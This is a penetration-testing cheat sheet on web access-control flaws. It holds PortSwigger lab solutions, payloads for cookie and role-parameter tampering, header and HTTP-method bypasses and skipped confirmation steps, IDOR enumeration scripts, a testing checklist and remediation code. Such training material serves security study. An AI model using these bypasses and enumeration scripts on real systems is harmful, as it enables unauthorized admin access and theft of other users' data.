# Access Control Vulnerabilities - Quick Reference Cheat Sheet

**Fast exploitation guide for penetration testing access control flaws**

---

## Table of Contents

- [Quick Lab Solutions](#quick-lab-solutions)
- [Common Vulnerability Patterns](#common-vulnerability-patterns)
- [Exploitation Payloads](#exploitation-payloads)
- [Burp Suite Quick Commands](#burp-suite-quick-commands)
- [Testing Checklist](#testing-checklist)
- [Common Bypass Techniques](#common-bypass-techniques)

---

## Quick Lab Solutions

### Lab 1: Unprotected Admin (robots.txt)
```bash
# Navigate to
/robots.txt
# Then access
/administrator-panel
# Delete carlos
```

### Lab 2: Unprotected Admin (Hidden URL)
```bash
# View page source, search for "admin"
# Find admin URL in JavaScript
# Navigate to discovered URL (e.g., /admin-abc123)
```

### Lab 3: User Role Cookie
```bash
# Enable response interception in Burp
# Login as wiener:peter
# Intercept response, change Admin=false to Admin=true
# Access /admin
```

### Lab 4: Role Modification in Profile
```json
# Modify email change request to include roleid
POST /my-account/change-email
{"email":"test@test.com","roleid":2}
```

### Lab 5: Basic IDOR
```bash
# Change URL parameter
/my-account?id=wiener → /my-account?id=carlos
# Extract API key from response
```

### Lab 6: IDOR with GUID
```bash
# Find carlos's blog post, extract GUID from profile link
# Use GUID in account URL
/my-account?id=[carlos-guid]
```

### Lab 7: Data Leakage in Redirect
```bash
# Request: /my-account?id=carlos
# Check response body (302) for API key before redirect
```

### Lab 8: Password Disclosure
```bash
# Request: /my-account?id=administrator
# View HTML source for password in input field value
# Login as administrator with extracted password
```

### Lab 9: IDOR Files
```bash
# View transcript, note URL: /download-transcript/2.txt
# Change to: /download-transcript/1.txt
# Extract password from carlos's transcript
```

### Lab 10: X-Original-URL Bypass
```http
GET /?username=carlos HTTP/1.1
X-Original-URL: /admin/delete
```

### Lab 11: Method-Based Bypass
```bash
# Capture POST /admin-roles
# Change to GET /admin-roles?username=wiener&action=upgrade
# Use non-admin session
```

### Lab 12: Multi-Step Bypass
```http
# Skip to confirmation step
POST /admin-roles HTTP/1.1
Cookie: [non-admin-session]

username=wiener&action=upgrade&confirmed=true
```

### Lab 13: Referer-Based Bypass
```http
GET /admin-roles?username=wiener&action=upgrade HTTP/1.1
Cookie: [non-admin-session]
Referer: https://[lab].web-security-academy.net/admin
```

---

## Common Vulnerability Patterns

### 1. Unprotected Functionality
**Pattern:** Admin pages with no authentication
**Discovery:**
```bash
/robots.txt
/admin
/administrator
/admin.php
/admin-panel
/control-panel
/.git/config
/backup
```

**Exploitation:**
- Direct URL access
- Directory brute-forcing
- Source code analysis

---

### 2. Parameter-Based Access Control
**Pattern:** Trust in client-side parameters

**Cookies:**
```http
Admin=true
isAdmin=1
role=administrator
roleid=2
user_level=9
privilege=admin
```

**JSON Body:**
```json
{"email":"user@test.com","role":"admin"}
{"username":"user","isAdmin":true}
{"user_id":123,"privilege_level":"administrator"}
```

**URL Parameters:**
```
?role=admin
?privilege=high
?admin=true
?user_type=administrator
```

---

### 3. IDOR (Insecure Direct Object Reference)
**Pattern:** Direct reference to objects without authorization

**Sequential IDs:**
```
/user/profile?id=1
/api/document/123
/download/file/456
/invoice?id=789
```

**GUIDs:**
```
/user/abc123-def456-ghi789
/document/550e8400-e29b-41d4-a716-446655440000
```

**Predictable Filenames:**
```
/download/1.txt, 2.txt, 3.txt
/transcript/session_001.txt
/backup/2025-01-01.zip
```

**Testing:**
```bash
# Sequential enumeration
for i in {1..100}; do
  curl "https://target.com/api/user/$i" -H "Cookie: session=..."
done

# Burp Intruder: /user/§1§ with Numbers payload 1-1000
```

---

### 4. HTTP Method Bypass
**Pattern:** Authorization only on specific methods

**Vulnerable:**
```
POST /admin/delete-user   [Protected]
GET /admin/delete-user    [Vulnerable!]
PUT /admin/delete-user    [Vulnerable!]
```

**Testing:**
```http
# Original (blocked)
POST /admin-roles HTTP/1.1
username=target&action=upgrade

# Bypass
GET /admin-roles?username=target&action=upgrade HTTP/1.1
PUT /admin-roles HTTP/1.1
PATCH /admin-roles HTTP/1.1
```

---

### 5. URL/Header Manipulation
**Pattern:** Frontend blocks URL, backend reads headers

**Alternative Headers:**
```http
X-Original-URL: /admin
X-Rewrite-URL: /admin/delete?user=carlos
X-Custom-IP-Authorization: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
```

**Exploitation:**
```http
# Access blocked /admin
GET / HTTP/1.1
X-Original-URL: /admin

# Delete user
GET /?username=carlos HTTP/1.1
X-Original-URL: /admin/delete
```

---

### 6. Referer-Based Controls
**Pattern:** Checking Referer header for authorization

**Vulnerable Code Logic:**
```python
if '/admin' in request.headers.get('Referer'):
    allow_action()
```

**Exploitation:**
```http
GET /admin-roles?username=wiener&action=upgrade HTTP/1.1
Cookie: [non-admin-session]
Referer: https://target.com/admin
```

---

### 7. Multi-Step Process Flaws
**Pattern:** Authorization only on first step

**Vulnerable Workflow:**
```
Step 1: /admin/delete?user=carlos        [Checked]
Step 2: /admin/delete?user=carlos&confirm=true  [NOT Checked!]
```

**Exploitation:**
```bash
# Skip directly to confirmation
curl -X POST "https://target.com/admin/delete" \
  -d "user=carlos&confirmed=true" \
  -H "Cookie: [non-admin-session]"
```

---

## Exploitation Payloads

### IDOR Enumeration

**Burp Intruder Setup:**
```
Position: /api/user/§1§
Payload type: Numbers
From: 1
To: 1000
Step: 1
```

**Python Script:**
```python
import requests

session = "your-session-cookie"
base_url = "https://target.com/api/user/"

for user_id in range(1, 1000):
    response = requests.get(
        f"{base_url}{user_id}",
        cookies={"session": session}
    )
    if response.status_code == 200:
        print(f"[+] User {user_id}: {response.text}")
```

**Bash One-Liner:**
```bash
for i in {1..100}; do
  curl -s "https://target.com/download/$i.txt" \
    -H "Cookie: session=abc123" \
    -o "file_$i.txt";
done
```

---

### Cookie Manipulation

**Response Interception (Burp):**
```
Proxy > Options > Intercept Server Responses > Enable

Original Response:
Set-Cookie: Admin=false; Path=/

Modified Response:
Set-Cookie: Admin=true; Path=/
```

**Browser Console:**
```javascript
// View cookies
document.cookie

// Modify cookie
document.cookie = "Admin=true; path=/";
document.cookie = "role=administrator; path=/";
```

**cURL:**
```bash
curl https://target.com/admin \
  -H "Cookie: session=abc123; Admin=true"
```

---

### JSON Parameter Injection

**Original Request:**
```json
POST /api/user/update
{"email": "user@test.com"}
```

**Modified Request:**
```json
POST /api/user/update
{"email": "user@test.com", "role": "admin"}
{"email": "user@test.com", "isAdmin": true}
{"email": "user@test.com", "roleid": 2}
{"email": "user@test.com", "privilege_level": "administrator"}
```

---

### HTTP Method Bypass

**Burp Repeater:**
```
Right-click request > Change request method
POST → GET (parameters move to query string)
GET → POST (parameters move to body)
```

**cURL:**
```bash
# Try different methods
curl -X GET "https://target.com/admin/delete?user=carlos"
curl -X PUT "https://target.com/admin/delete?user=carlos"
curl -X PATCH "https://target.com/admin/delete?user=carlos"
curl -X DELETE "https://target.com/admin/delete?user=carlos"
```

---

### Header Bypass

**X-Original-URL:**
```http
GET / HTTP/1.1
Host: target.com
X-Original-URL: /admin
X-Rewrite-URL: /admin
```

**Referer Spoofing:**
```http
GET /admin-action HTTP/1.1
Host: target.com
Referer: https://target.com/admin
Referer: http://localhost/admin
```

**IP Spoofing (for IP-based controls):**
```http
GET /admin HTTP/1.1
Host: target.com
X-Forwarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
```

---

## Burp Suite Quick Commands

### Essential Shortcuts
```
Ctrl+R    - Send to Repeater
Ctrl+I    - Send to Intruder
Ctrl+Shift+B - Base64 encode/decode
Ctrl+Shift+U - URL encode/decode
Ctrl+F    - Find in response
```

### Response Interception Setup
```
1. Proxy > Options
2. Intercept Server Responses
3. Check "Intercept responses based on the following rules"
4. Enable rule for target domain
```

### Change Request Method
```
Right-click request in Repeater > Change request method
POST → GET: Body params become query string
GET → POST: Query params become body
```

### Burp Intruder Quick Setup
```
1. Send request to Intruder (Ctrl+I)
2. Clear all payload markers (Clear §)
3. Select value to fuzz, click Add §
4. Payloads tab > Payload type: Numbers
5. Configure range (e.g., 1-1000)
6. Start attack
```

### Compare Responses
```
Right-click response > Send to Comparer
Compare multiple responses to find differences
Useful for finding data leakage
```

---

## Testing Checklist

### Pre-Testing
- [ ] Map application functionality
- [ ] Identify all user roles (guest, user, admin, etc.)
- [ ] Document all authenticated endpoints
- [ ] Note all parameter names (id, user, role, etc.)

### Authentication Testing
- [ ] Test access without authentication
- [ ] Test with expired session
- [ ] Test with invalid session token
- [ ] Test session sharing between users

### Horizontal Privilege Escalation
- [ ] Create two user accounts
- [ ] Identify user-specific resources
- [ ] Test User A accessing User B's resources
- [ ] Test IDOR in all user-specific endpoints
- [ ] Test profile/account pages with different IDs
- [ ] Test file downloads with different IDs
- [ ] Test API endpoints with different user identifiers

### Vertical Privilege Escalation
- [ ] Test admin functions as regular user
- [ ] Test parameter manipulation (cookies, JSON, form data)
- [ ] Test method-based bypasses (POST → GET)
- [ ] Test header-based bypasses (X-Original-URL, Referer)
- [ ] Test multi-step processes independently
- [ ] Test direct URL access to admin pages
- [ ] Check robots.txt and JavaScript for hidden paths

### IDOR Testing
- [ ] Identify all object references (IDs, GUIDs, filenames)
- [ ] Test sequential enumeration
- [ ] Test with other users' identifiers
- [ ] Test file access with different filenames
- [ ] Test API endpoints with different resource IDs
- [ ] Check for data leakage in error messages
- [ ] Test batch operations (mass enumeration)

### Method-Based Testing
- [ ] Test all endpoints with GET, POST, PUT, PATCH, DELETE
- [ ] Convert POST requests to GET
- [ ] Test HEAD and OPTIONS methods
- [ ] Verify authorization on each method

### Header Manipulation
- [ ] Test X-Original-URL header
- [ ] Test X-Rewrite-URL header
- [ ] Test Referer-based controls
- [ ] Test X-Forwarded-For for IP-based controls
- [ ] Test custom application headers

### Data Leakage
- [ ] Check redirect response bodies
- [ ] Examine error messages
- [ ] Review HTML comments
- [ ] Check JavaScript for sensitive data
- [ ] Test for information disclosure in 401/403 responses

### Documentation
- [ ] Document all vulnerable endpoints
- [ ] Record exploitation steps
- [ ] Capture HTTP requests/responses
- [ ] Note CVSS scores
- [ ] Provide remediation recommendations

---

## Common Bypass Techniques

### 1. Cookie Manipulation

**Technique:** Modify authorization cookies
```javascript
// In browser console
document.cookie = "Admin=true; path=/";
document.cookie = "role=administrator; path=/";
```

**Burp Suite:**
```
Enable response interception
Modify Set-Cookie values before browser receives them
Change Admin=false to Admin=true
```

---

### 2. Parameter Injection

**Technique:** Add privilege parameters to requests
```json
# Original
{"email": "user@test.com"}

# Injected
{"email": "user@test.com", "role": "admin"}
{"email": "user@test.com", "isAdmin": true}
{"email": "user@test.com", "roleid": 2}
```

---

### 3. Sequential ID Enumeration

**Technique:** Iterate through predictable identifiers
```bash
# Manual
/user/profile?id=1
/user/profile?id=2
/user/profile?id=3

# Automated (Burp Intruder)
/user/profile?id=§1§
Payload: Numbers 1-10000
```

---

### 4. Method Conversion

**Technique:** Change HTTP method to bypass authorization
```http
# Blocked
POST /admin-roles
Body: username=user&action=upgrade

# Bypass
GET /admin-roles?username=user&action=upgrade
```

---

### 5. Alternative URL Headers

**Technique:** Use headers to specify URL path
```http
GET / HTTP/1.1
X-Original-URL: /admin

GET /?username=carlos HTTP/1.1
X-Original-URL: /admin/delete
```

---

### 6. Referer Spoofing

**Technique:** Fake the request origin
```http
GET /admin-action HTTP/1.1
Referer: https://target.com/admin
```

---

### 7. Multi-Step Skipping

**Technique:** Jump directly to confirmation steps
```http
# Step 1 (protected)
POST /admin/delete?user=carlos

# Step 2 (not protected)
POST /admin/delete?user=carlos&confirmed=true
```

---

### 8. GUID Discovery

**Technique:** Find GUIDs through public interfaces
```
1. Look for blog posts, comments, forum posts
2. Click on usernames to view profiles
3. Extract GUID from URL
4. Use GUID in privileged endpoints
```

---

### 9. Data Leakage Exploitation

**Technique:** Extract data from redirect responses
```bash
# Request returns 302 redirect
# But response body contains sensitive data
# View in Burp Repeater, don't follow redirect
```

---

### 10. Password Field Extraction

**Technique:** View HTML source for masked passwords
```html
<!-- Visible in source, masked in browser -->
<input type="password" value="secret-password-123" />
```

**Browser Console:**
```javascript
// Reveal all password fields
document.querySelectorAll('input[type="password"]').forEach(
  input => input.type = 'text'
);
```

---

## Quick Reference Tables

### Common Parameter Names for Access Control

| Parameter | Common Values | Location |
|-----------|--------------|----------|
| Admin | true, false, 1, 0 | Cookie, JSON |
| role | admin, user, guest | Cookie, JSON, Form |
| roleid | 1, 2, 3 | JSON, Form |
| isAdmin | true, false | JSON, Cookie |
| user_level | 1-10 | Cookie, JSON |
| privilege | admin, high, low | JSON, Form |
| id | numbers, GUIDs | URL, Form |
| user_id | numbers, GUIDs | URL, JSON |
| username | strings | URL, Form |

---

### Common Admin Paths

| Path | Description |
|------|-------------|
| /admin | Standard admin panel |
| /administrator | Alternative admin panel |
| /admin-panel | Common naming |
| /admin.php | PHP admin |
| /admin.asp | ASP admin |
| /administrator-panel | Extended name |
| /control-panel | Alternative |
| /cpanel | Control panel |
| /manage | Management interface |
| /dashboard | Admin dashboard |

---

### HTTP Methods to Test

| Method | Use Case |
|--------|----------|
| GET | Standard retrieval |
| POST | Form submission |
| PUT | Full update |
| PATCH | Partial update |
| DELETE | Deletion |
| HEAD | Headers only |
| OPTIONS | Supported methods |

---

### Alternative URL Headers

| Header | Purpose |
|--------|---------|
| X-Original-URL | Override request URL |
| X-Rewrite-URL | URL rewriting |
| X-Forwarded-For | IP spoofing |
| X-Remote-IP | IP specification |
| X-Originating-IP | Source IP |
| X-Client-IP | Client IP |
| Referer | Request origin |

---

## Automation Scripts

### IDOR Enumeration (Python)

```python
#!/usr/bin/env python3
import requests

TARGET = "https://target.com/api/user/"
SESSION = "your-session-cookie"
START_ID = 1
END_ID = 1000

for user_id in range(START_ID, END_ID + 1):
    url = f"{TARGET}{user_id}"
    headers = {"Cookie": f"session={SESSION}"}

    response = requests.get(url, headers=headers)

    if response.status_code == 200:
        print(f"[+] User {user_id} accessible")
        print(response.text[:200])
        print("-" * 50)
    elif response.status_code == 403:
        print(f"[-] User {user_id} forbidden")
    else:
        print(f"[?] User {user_id} - Status {response.status_code}")
```

---

### Method Testing (Bash)

```bash
#!/bin/bash

URL="https://target.com/admin-roles?username=wiener&action=upgrade"
SESSION="your-session-cookie"

methods=("GET" "POST" "PUT" "PATCH" "DELETE" "HEAD" "OPTIONS")

for method in "${methods[@]}"; do
    echo "[*] Testing $method"
    curl -X $method "$URL" \
        -H "Cookie: session=$SESSION" \
        -s -o /dev/null -w "Status: %{http_code}\n"
done
```

---

### Header Fuzzing (Python)

```python
#!/usr/bin/env python3
import requests

URL = "https://target.com/admin"
SESSION = "your-session-cookie"

headers_to_test = [
    ("X-Original-URL", "/admin"),
    ("X-Rewrite-URL", "/admin"),
    ("X-Forwarded-For", "127.0.0.1"),
    ("X-Remote-IP", "127.0.0.1"),
    ("X-Client-IP", "127.0.0.1"),
    ("Referer", "https://target.com/admin"),
]

for header_name, header_value in headers_to_test:
    headers = {
        "Cookie": f"session={SESSION}",
        header_name: header_value
    }

    response = requests.get(URL, headers=headers)

    print(f"[*] Testing {header_name}: {header_value}")
    print(f"    Status: {response.status_code}")
    if response.status_code == 200:
        print(f"    [+] SUCCESS with {header_name}")
    print()
```

---

## Remediation Quick Guide

### For Developers

**1. Never Trust Client Data**
```python
# Bad
if request.cookies.get('Admin') == 'true':
    allow_admin_action()

# Good
if session.user.role == 'admin':
    allow_admin_action()
```

**2. Centralize Authorization**
```python
# Create single authorization function
def check_authorization(user, resource, action):
    return user.has_permission(resource, action)

# Use everywhere
if not check_authorization(current_user, 'user', 'delete'):
    return "Unauthorized", 403
```

**3. Validate on Every Request**
```python
# Apply to all methods and all steps
@app.route('/admin-roles', methods=['GET', 'POST', 'PUT'])
@require_admin  # Check on every request
def admin_roles():
    # Business logic
    pass
```

**4. Use Indirect References**
```python
# Bad - direct reference
file_path = f"/files/{user_input}.txt"

# Good - indirect reference
file_mapping = get_user_files(current_user)
if user_input in file_mapping:
    file_path = file_mapping[user_input]
```

**5. Implement Deny by Default**
```python
# Start with deny
def can_access_resource(user, resource):
    # Explicitly allow specific cases
    if user.is_admin:
        return True
    if user.id == resource.owner_id:
        return True
    # Deny everything else
    return False
```

---

## Tools

### Essential Tools
- **Burp Suite** (Community/Pro)
- **OWASP ZAP**
- **curl** / **httpie**
- Browser DevTools

### Burp Extensions
- **Autorize** - Automated authorization testing
- **AuthMatrix** - Role-based testing matrix
- **Auth Analyzer** - Session analysis
- **Auto Repeater** - Automated testing

### Scripts
- Custom Python/Bash enumeration scripts
- ffuf for fuzzing
- Nuclei with access control templates

---

## OWASP Top 10 Reference

**A01:2021 - Broken Access Control**

**CWE Mappings:**
- CWE-200: Exposure of Sensitive Information
- CWE-201: Exposure of Sensitive Information Through Sent Data
- CWE-352: Cross-Site Request Forgery (CSRF)
- CWE-284: Improper Access Control
- CWE-285: Improper Authorization
- CWE-352: Cross-Site Request Forgery
- CWE-359: Exposure of Private Personal Information
- CWE-639: Authorization Bypass Through User-Controlled Key
- CWE-22: Path Traversal
- CWE-425: Direct Request (Forced Browsing)

---

## Additional Resources

### PortSwigger
- Access Control Labs: https://portswigger.net/web-security/access-control
- Burp Suite: https://portswigger.net/burp

### OWASP
- Top 10 2021: https://owasp.org/Top10/A01_2021-Broken_Access_Control/
- Testing Guide: https://owasp.org/www-project-web-security-testing-guide/
- Access Control Cheat Sheet: https://cheatsheetseries.owasp.org/

### Practice
- PortSwigger Academy Labs (Free)
- HackTheBox
- TryHackMe
- PentesterLab

---

**Last Updated:** 2025
**Version:** 1.0
